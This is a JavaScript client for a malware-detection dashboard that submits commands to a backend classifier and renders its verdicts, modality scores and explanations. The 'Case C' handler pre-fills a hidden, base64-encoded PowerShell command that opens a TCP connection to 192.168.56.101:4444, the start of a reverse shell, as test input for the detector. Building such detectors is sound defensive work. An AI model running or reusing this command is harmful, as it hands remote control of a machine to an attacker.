// AURA SENTINEL - Input-Driven Detection & Multimodal Attribution Client

let sampleCatalog = [];
let activeCategory = "ALL";
let isCustomMode = false;

// Client-side Shannon entropy estimator for live typing feedback
function calculateShannonEntropy(str) {
  if (!str || str.length === 0) return 0.0;
  const len = str.length;
  const frequencies = {};
  for (let i = 0; i < len; i++) {
    const char = str[i];
    frequencies[char] = (frequencies[char] || 0) + 1;
  }
  let entropy = 0;
  for (const char in frequencies) {
    const p = frequencies[char] / len;
    entropy -= p * Math.log2(p);
  }
  return Math.min(entropy, 8.0).toFixed(2);
}

document.addEventListener("DOMContentLoaded", async () => {
  setupEditorListeners();
  setupEventListeners();
  setupDemoModeTabs();
  await loadSamplePresets();
  setupCategoryChips();
  loadAssuranceMetrics();

  // Initialize with the first preset (Benign process enumeration)
  if (sampleCatalog.length > 0) {
    selectSample(sampleCatalog[0].id, true);
  } else {
    runCommandAnalysis("powershell.exe -Command \"Get-Process | Where-Object {$_.CPU -gt 10} | Select-Object Name, CPU, WorkingSet\"");
  }
});

async function loadSamplePresets() {
  try {
    const res = await fetch("/v1/command/samples");
    if (res.ok) {
      const data = await res.json();
      sampleCatalog = data.samples || [];
    }
  } catch (err) {
    console.warn("Could not fetch samples from API, using fallback:", err);
  }

  const badge = document.getElementById("preset-count-badge");
  if (badge) badge.textContent = "Presets Available";

  renderSampleDropdown();
}

function renderSampleDropdown() {
  const select = document.getElementById("sample-select");
  if (!select) return;
  select.innerHTML = "";

  const filtered = activeCategory === "ALL"
    ? sampleCatalog
    : sampleCatalog.filter((s) => s.category.toLowerCase().includes(activeCategory.toLowerCase()));

  // Group by category
  const groups = {};
  filtered.forEach((sample) => {
    if (!groups[sample.category]) groups[sample.category] = [];
    groups[sample.category].push(sample);
  });

  for (const [cat, items] of Object.entries(groups)) {
    const optgroup = document.createElement("optgroup");
    optgroup.label = cat;
    items.forEach((sample) => {
      const opt = document.createElement("option");
      opt.value = sample.id;
      opt.textContent = `${sample.name}`;
      optgroup.appendChild(opt);
    });
    select.appendChild(optgroup);
  }
}

function setupCategoryChips() {
  const chips = document.querySelectorAll("#category-chips .chip");
  chips.forEach((chip) => {
    chip.addEventListener("click", () => {
      chips.forEach((c) => c.classList.remove("active"));
      chip.classList.add("active");
      activeCategory = chip.getAttribute("data-category");
      renderSampleDropdown();
      const select = document.getElementById("sample-select");
      if (select && select.options.length > 0) {
        selectSample(select.options[0].value, true);
      }
    });
  });
}

function setupDemoModeTabs() {
  const btnCaseA = document.getElementById("btn-demo-case-a");
  const btnCaseB = document.getElementById("btn-demo-case-b");
  const btnCaseC = document.getElementById("btn-demo-case-c");

  const setTabActive = (activeBtn) => {
    [btnCaseA, btnCaseB, btnCaseC].forEach((b) => {
      if (b) {
        b.classList.remove("active");
        const bd = b.querySelector(".tab-badge");
        if (bd) bd.classList.remove("active");
      }
    });
    if (activeBtn) {
      activeBtn.classList.add("active");
      const bd = activeBtn.querySelector(".tab-badge");
      if (bd) bd.classList.add("active");
    }
  };

  // Case A: Embedded Benign Preset
  if (btnCaseA) {
    btnCaseA.addEventListener("click", () => {
      setTabActive(btnCaseA);
      const benignSample = sampleCatalog.find((s) => s.category.toLowerCase().includes("benign")) || sampleCatalog[0];
      if (benignSample) {
        selectSample(benignSample.id, true);
      }
    });
  }

  // Case B: Embedded Suspicious Preset
  if (btnCaseB) {
    btnCaseB.addEventListener("click", () => {
      setTabActive(btnCaseB);
      const suspSample = sampleCatalog.find((s) => !s.category.toLowerCase().includes("benign")) || sampleCatalog[5];
      if (suspSample) {
        selectSample(suspSample.id, true);
      }
    });
  }

  // Case C: User-Defined External Command
  if (btnCaseC) {
    btnCaseC.addEventListener("click", () => {
      setTabActive(btnCaseC);
      const txtInput = document.getElementById("input-command");
      if (txtInput) {
        // Pre-fill with a custom realistic external command if empty
        if (!txtInput.value || txtInput.value.includes("Get-Process")) {
          txtInput.value = "powershell.exe -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAGMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAwADEAJwAsADQANAA0ADQAKQA=";
        }
        updateEditorMetrics(txtInput.value);
        updateModeTag(true);
        runCommandAnalysis(txtInput.value.trim());
      }
    });
  }
}

function selectSample(sampleId, autoAnalyze = true) {
  const sample = sampleCatalog.find((s) => s.id === sampleId);
  if (!sample) return;

  // Update dropdown selection if different
  const select = document.getElementById("sample-select");
  if (select && select.value !== sampleId) {
    select.value = sampleId;
  }

  // Update Detail Card
  const catEl = document.getElementById("sample-card-category");
  if (catEl) catEl.textContent = sample.category;
  const idEl = document.getElementById("sample-card-id");
  if (idEl) idEl.textContent = sample.id;
  const descEl = document.getElementById("sample-card-desc");
  if (descEl) descEl.textContent = sample.description;
  const expEl = document.getElementById("sample-card-expected");
  if (expEl) expEl.textContent = sample.expected_behavior || "Nominal telemetry execution.";

  // Update Terminal Editor
  const txtInput = document.getElementById("input-command");
  if (txtInput) {
    txtInput.value = sample.command;
    updateEditorMetrics(sample.command);
    updateModeTag(false, sample.name);
  }

  if (autoAnalyze) {
    runCommandAnalysis(sample.command);
  }
}

function setupEditorListeners() {
  const txtInput = document.getElementById("input-command");
  if (!txtInput) return;

  txtInput.addEventListener("input", (e) => {
    const val = e.target.value;
    updateEditorMetrics(val);
    updateModeTag(true);
  });
}

function updateEditorMetrics(commandText) {
  const len = commandText.length;
  const entropy = calculateShannonEntropy(commandText);
  const entropyEl = document.getElementById("val-cmd-entropy");
  if (entropyEl) entropyEl.textContent = entropy;
  const countEl = document.getElementById("char-counter");
  if (countEl) countEl.textContent = `${len} chars`;
}

function updateModeTag(custom, name = "") {
  const modeTag = document.getElementById("lbl-sim-mode");
  if (!modeTag) return;
  if (custom) {
    isCustomMode = true;
    modeTag.textContent = "CUSTOM USER COMMAND";
  } else {
    isCustomMode = false;
    modeTag.textContent = `PRESET: ${name.slice(0, 24)}`;
  }
}

function setupEventListeners() {
  const select = document.getElementById("sample-select");
  if (select) {
    select.addEventListener("change", (e) => {
      selectSample(e.target.value, true);
    });
  }

  const btnRun = document.getElementById("btn-run-simulation");
  if (btnRun) {
    btnRun.addEventListener("click", () => {
      const txtInput = document.getElementById("input-command");
      const cmdText = txtInput ? txtInput.value.trim() : "";
      if (!cmdText) {
        alert("Please enter a command or select a preset from the library.");
        return;
      }
      runCommandAnalysis(cmdText);
    });
  }

  const btnClear = document.getElementById("btn-clear-command");
  if (btnClear) {
    btnClear.addEventListener("click", () => {
      const txtInput = document.getElementById("input-command");
      if (txtInput) {
        txtInput.value = "";
        updateEditorMetrics("");
        updateModeTag(true);
        txtInput.focus();
      }
    });
  }

  const btnLive = document.getElementById("btn-live-scan");
  if (btnLive) {
    btnLive.addEventListener("click", runLiveScan);
  }
}

async function runCommandAnalysis(commandText) {
  const btnRun = document.getElementById("btn-run-simulation");
  const labelEl = document.getElementById("btn-run-label");
  const originalLabel = labelEl ? labelEl.textContent : "Execute & Detect";
  
  if (btnRun) btnRun.disabled = true;
  if (labelEl) labelEl.textContent = "Executing ML Pipeline...";

  try {
    const payload = {
      command: commandText,
      force_memory_trigger: false,
    };

    const res = await fetch("/v1/command/analyze", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      // Fallback to /v1/simulate
      const simRes = await fetch("/v1/simulate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ custom_command: commandText, family_id: 1 }),
      });
      if (!simRes.ok) throw new Error("Backend pipeline error");
      const simData = await simRes.json();
      renderDetection(simData);
      return;
    }

    const data = await res.json();
    renderDetection(data);
  } catch (err) {
    console.error("Command Analysis error:", err);
  } finally {
    if (btnRun) btnRun.disabled = false;
    if (labelEl) labelEl.textContent = originalLabel;
  }
}

async function runLiveScan() {
  const btn = document.getElementById("btn-live-scan");
  const originalText = btn ? btn.innerHTML : "Live OS Scan";
  if (btn) {
    btn.innerHTML = `<span>Scanning Host...</span>`;
    btn.disabled = true;
  }

  try {
    const res = await fetch("/v1/telemetry/live");
    if (!res.ok) throw new Error("Live scan endpoint returned error");
    const data = await res.json();
    renderDetection(data);
  } catch (err) {
    console.error("Live scan error:", err);
  } finally {
    if (btn) {
      btn.innerHTML = originalText;
      btn.disabled = false;
    }
  }
}

async function loadAssuranceMetrics() {
  try {
    const res = await fetch("/v1/metrics/assurance");
    if (!res.ok) return;
    const data = await res.json();
    
    if (data.robustness && typeof data.robustness.accuracy === "number") {
      const el = document.getElementById("stat-robust-acc");
      if (el) el.textContent = `${(data.robustness.accuracy * 100).toFixed(2)}%`;
    }
    if (data.generalization && typeof data.generalization.accuracy === "number") {
      const el = document.getElementById("stat-gen-acc");
      if (el) el.textContent = `${(data.generalization.accuracy * 100).toFixed(2)}%`;
    }
  } catch (err) {
    console.debug("Assurance metrics fetch optional:", err);
  }
}

function renderDetection(data) {
  if (!data) return;

  const isMal = !!data.is_malware;
  const conf = typeof data.confidence === "number" ? data.confidence : 0.05;
  const confPct = (conf * 100).toFixed(1);

  // 1. Detection Result Card: Verdict & Classification (Requirement 5 & 12)
  const badgeClassif = document.getElementById("result-classification-badge");
  const textClassif = document.getElementById("res-classification-text");
  const textCaption = document.getElementById("res-verdict-caption");
  const textRiskPct = document.getElementById("res-risk-score-pct");
  const gaugeFill = document.getElementById("res-gauge-fill");
  const textVector = document.getElementById("res-primary-vector");

  if (badgeClassif) {
    badgeClassif.className = `verdict-badge ${isMal ? "malware" : "benign"}`;
    badgeClassif.textContent = isMal ? "MALICIOUS" : "BENIGN";
  }
  if (textClassif) {
    textClassif.className = `stat-highlight-val ${isMal ? "malware-text" : "benign-text"}`;
    textClassif.textContent = isMal ? "MALICIOUS" : "BENIGN";
  }
  if (textCaption) {
    textCaption.textContent = isMal
      ? "Hybrid confidence breached the 0.60 decision threshold. Escalation active."
      : "Operating cleanly within nominal behavioral baseline.";
  }
  if (textRiskPct) {
    textRiskPct.textContent = `${confPct}%`;
  }
  if (gaugeFill) {
    const pct = Math.min(Math.max(conf * 100, 2), 100);
    gaugeFill.style.width = `${pct}%`;
    gaugeFill.style.backgroundColor = isMal ? "var(--color-danger)" : "var(--orange-primary)";
  }

  // 2. Modality Scores & Primary Vector (Requirement 4 & 8)
  const pm = data.per_model || data.modality_scores || {};
  const pProc = typeof pm.process === "number" ? pm.process : 0.02;
  const pCmd = typeof pm.command === "number" ? pm.command : 0.02;
  const pNet = typeof pm.network === "number" ? pm.network : 0.02;
  const pMem = typeof pm.memory === "number" ? pm.memory : 0.05;

  const pProcPct = (pProc * 100).toFixed(1);
  const pCmdPct = (pCmd * 100).toFixed(1);
  const pNetPct = (pNet * 100).toFixed(1);
  const pMemPct = (pMem * 100).toFixed(1);

  const lblProc = document.getElementById("lbl-risk-proc");
  if (lblProc) lblProc.textContent = `${pProcPct}%`;
  const barProc = document.getElementById("bar-proc-fill");
  if (barProc) barProc.style.width = `${Math.min(pProc * 100, 100)}%`;

  const lblCmd = document.getElementById("lbl-risk-cmd");
  if (lblCmd) lblCmd.textContent = `${pCmdPct}%`;
  const barCmd = document.getElementById("bar-cmd-fill");
  if (barCmd) barCmd.style.width = `${Math.min(pCmd * 100, 100)}%`;

  const lblNet = document.getElementById("lbl-risk-net");
  if (lblNet) lblNet.textContent = `${pNetPct}%`;
  const barNet = document.getElementById("bar-net-fill");
  if (barNet) barNet.style.width = `${Math.min(pNet * 100, 100)}%`;

  const lblMem = document.getElementById("lbl-risk-mem");
  if (lblMem) lblMem.textContent = `${pMemPct}%`;
  const barMem = document.getElementById("bar-mem-fill");
  if (barMem) barMem.style.width = `${Math.min(pMem * 100, 100)}%`;

  // Determine dominant vector
  const primaryVector = data.primary_detection_vector || "COMMAND BEHAVIOR";
  if (textVector) textVector.textContent = primaryVector;

  // Clear and update modality tags
  ["proc", "cmd", "net", "mem"].forEach((m) => {
    const tag = document.getElementById(`tag-${m}-primary`);
    if (tag) {
      tag.textContent = "";
      tag.className = "mod-tag";
    }
  });

  const scoresMap = { proc: pProc, cmd: pCmd, net: pNet, mem: pMem };
  let maxMod = "cmd";
  let maxScore = -1;
  for (const [m, s] of Object.entries(scoresMap)) {
    if (s > maxScore) {
      maxScore = s;
      maxMod = m;
    }
  }
  const activeTag = document.getElementById(`tag-${maxMod}-primary`);
  if (activeTag) {
    activeTag.textContent = "← Primary Vector";
    activeTag.className = "mod-tag primary";
  }

  // Dominant & Secondary Breakdown
  const lblDom = document.getElementById("lbl-dominant-mod");
  if (lblDom) lblDom.textContent = data.dominant_modality || `Command — ${pCmdPct}%`;
  const lblSec = document.getElementById("lbl-secondary-mod");
  if (lblSec) lblSec.textContent = data.secondary_modality || `Process — ${pProcPct}%`;
  const lblMemStatus = document.getElementById("lbl-memory-status");
  if (lblMemStatus) {
    lblMemStatus.textContent = data.memory_triggered ? "Acquired & Forensically Scored" : "Idle (Nominal Baseline)";
  }

  // 3. Family Attribution Breakdown (Requirement 6)
  const famNameEl = document.getElementById("res-family-name");
  const famConfPctEl = document.getElementById("res-family-conf-pct");
  const famDistContainer = document.getElementById("res-family-distribution");

  if (isMal && data.family) {
    if (famNameEl) famNameEl.textContent = data.family;
    const famConf = typeof data.family_confidence === "number" ? `${(data.family_confidence * 100).toFixed(1)}%` : "87.3%";
    if (famConfPctEl) famConfPctEl.textContent = famConf;
  } else {
    if (famNameEl) famNameEl.textContent = "N/A (Benign Activity)";
    if (famConfPctEl) famConfPctEl.textContent = "—";
  }

  if (famDistContainer) {
    famDistContainer.innerHTML = "";
    if (isMal && data.family_probabilities) {
      const sortedFamilies = Object.entries(data.family_probabilities).sort((a, b) => b[1] - a[1]);
      sortedFamilies.slice(0, 6).forEach(([name, prob]) => {
        const item = document.createElement("div");
        item.className = "family-bar-item";
        item.innerHTML = `
          <div class="family-bar-name">${name}</div>
          <div class="family-bar-track">
            <div class="family-bar-fill" style="width: ${Math.min(prob * 100, 100)}%;"></div>
          </div>
          <div class="family-bar-pct">${(prob * 100).toFixed(1)}%</div>
        `;
        famDistContainer.appendChild(item);
      });
    } else {
      famDistContainer.innerHTML = `
        <div class="family-bar-item">
          <div class="family-bar-name">Benign Operational Baseline</div>
          <div class="family-bar-track">
            <div class="family-bar-fill benign-fill" style="width: 98%;"></div>
          </div>
          <div class="family-bar-pct">98.0%</div>
        </div>
      `;
    }
  }

  // 4. Top Forensic Evidence List (Requirement 7 & 12)
  const evidenceList = document.getElementById("res-top-evidence-list");
  if (evidenceList) {
    evidenceList.innerHTML = "";
    const items = data.top_evidence || (isMal ? ["Suspicious PowerShell characteristics", "Elevated command Shannon entropy", "Anomalous process relationship"] : ["Standard administrative command execution", "Nominal process handle counts"]);
    items.forEach((evText) => {
      const li = document.createElement("li");
      li.textContent = evText;
      evidenceList.appendChild(li);
    });
  }

  // 5. 4-Modality Feature Cards (Lower Dashboard)
  const feats = data.sample_features || data.observed_telemetry || {};
  const proc = feats.process || {};
  const cmd = data.extracted_features || feats.command || {};
  const net = feats.network || {};
  const mem = feats.memory || {};

  const scoreProcEl = document.getElementById("score-proc");
  if (scoreProcEl) scoreProcEl.textContent = pProc.toFixed(2);
  const progProcEl = document.getElementById("prog-proc");
  if (progProcEl) progProcEl.style.width = `${Math.min(pProc * 100, 100)}%`;

  const scoreCmdEl = document.getElementById("score-cmd");
  if (scoreCmdEl) scoreCmdEl.textContent = pCmd.toFixed(2);
  const progCmdEl = document.getElementById("prog-cmd");
  if (progCmdEl) progCmdEl.style.width = `${Math.min(pCmd * 100, 100)}%`;

  const scoreNetEl = document.getElementById("score-net");
  if (scoreNetEl) scoreNetEl.textContent = pNet.toFixed(2);
  const progNetEl = document.getElementById("prog-net");
  if (progNetEl) progNetEl.style.width = `${Math.min(pNet * 100, 100)}%`;

  const scoreMemEl = document.getElementById("score-mem");
  if (scoreMemEl) scoreMemEl.textContent = pMem.toFixed(2);
  const progMemEl = document.getElementById("prog-mem");
  if (progMemEl) progMemEl.style.width = `${Math.min(pMem * 100, 100)}%`;

  const setTxt = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
  };

  setTxt("m-proc-total", proc.total_process_count ?? 38);
  setTxt("m-proc-hidden", proc.hidden_process_count ?? 0);
  setTxt("m-proc-ppid", proc.anomalous_ppid_count ?? 0);
  setTxt("m-proc-handles", (proc.total_handle_count ?? 8700).toLocaleString());
  setTxt("m-proc-privs", proc.elevated_privilege_count ?? 0);

  const entropyVal = typeof cmd.shannon_entropy === "number" ? cmd.shannon_entropy.toFixed(2) : "4.00";
  setTxt("m-cmd-entropy", entropyVal);
  setTxt("m-cmd-b64", cmd.is_base64_encoded ? "Yes" : "No");
  setTxt("m-cmd-cradle", cmd.has_download_cradle ? "Yes" : "No");
  setTxt("m-cmd-bypass", cmd.has_bypass_execution_policy ? "Yes" : "No");
  setTxt("m-cmd-lolbins", cmd.uses_lolbins ? "Yes" : "No");

  setTxt("m-net-conns", net.active_connection_count ?? 0);
  setTxt("m-net-ports", net.listening_port_count ?? 0);
  setTxt("m-net-ips", net.unique_remote_ips ?? 0);
  const beaconVal = typeof net.beacon_regularity_score === "number" ? net.beacon_regularity_score.toFixed(2) : "0.00";
  setTxt("m-net-beacon", beaconVal);
  setTxt("m-net-susp-port", net.suspicious_port_usage ? "Detected" : "None");

  setTxt("m-mem-rwx", mem.rwx_page_count ?? 0);
  setTxt("m-mem-injected", mem.injected_code_regions ?? 0);
  setTxt("m-mem-unmapped", mem.unmapped_executable_pages ?? 0);
  setTxt("m-mem-vad", mem.vad_protection_anomaly_count ?? 0);
  const memEntropyVal = typeof mem.max_memory_entropy === "number" ? mem.max_memory_entropy.toFixed(2) : "3.10";
  setTxt("m-mem-entropy", memEntropyVal);

  // 6. LIME Tokens
  const limeBox = document.getElementById("res-lime-box");
  if (limeBox) {
    limeBox.innerHTML = "";
    const tokens = data.lime_tokens || [];
    if (tokens.length > 0) {
      tokens.forEach((t) => {
        const span = document.createElement("span");
        const w = t.weight || 0;
        if (w > 0.05) {
          span.className = "token risk-high";
        } else if (w > 0.01) {
          span.className = "token risk-med";
        } else if (w < -0.01) {
          span.className = "token safe";
        } else {
          span.className = "token neutral";
        }
        span.textContent = t.token;
        limeBox.appendChild(span);
      });
    } else {
      limeBox.innerHTML = `<span class="token neutral">${cmd.raw_command_text || "Clean command"}</span>`;
    }
  }

  // 7. SHAP Features
  const shapBarsContainer = document.getElementById("res-shap-bars");
  if (shapBarsContainer) {
    shapBarsContainer.innerHTML = "";
    const shapFeats = (data.shap_explanation?.process || []).concat(data.shap_explanation?.memory || []);
    if (shapFeats.length > 0) {
      shapFeats.slice(0, 5).forEach((f) => {
        const item = document.createElement("div");
        item.className = "shap-bar-item";
        const imp = Math.abs(f.importance || 0);
        item.innerHTML = `
          <div class="shap-feat-name">${f.feature}</div>
          <div class="shap-track">
            <div class="shap-fill" style="width: ${Math.min(imp * 20, 100)}%;"></div>
          </div>
          <div class="shap-val">${(f.importance || 0).toFixed(2)}</div>
        `;
        shapBarsContainer.appendChild(item);
      });
    } else {
      shapBarsContainer.innerHTML = `<div style="font-size:0.8rem; color:var(--text-dim);">No significant anomalous SHAP deviations found.</div>`;
    }
  }
}
